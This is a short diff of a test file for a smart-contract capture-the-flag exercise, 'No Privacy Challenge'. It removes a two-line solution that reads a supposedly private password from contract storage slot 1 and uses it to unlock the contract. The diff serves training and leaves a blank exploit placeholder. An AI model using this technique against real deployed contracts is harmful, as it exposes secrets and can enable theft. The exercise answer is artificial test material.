@@ -18,8 +18,6 @@ describe("No Privacy Challenge", function () {
 
   it("Exploit", async function () {
     /** CODE YOUR EXPLOIT HERE  */
-    const pwd = await ethers.provider.getStorageAt(this.lock.address, 1);
-    this.lock.connect(bob).unlock(pwd);
   });
 
   after(async function () {
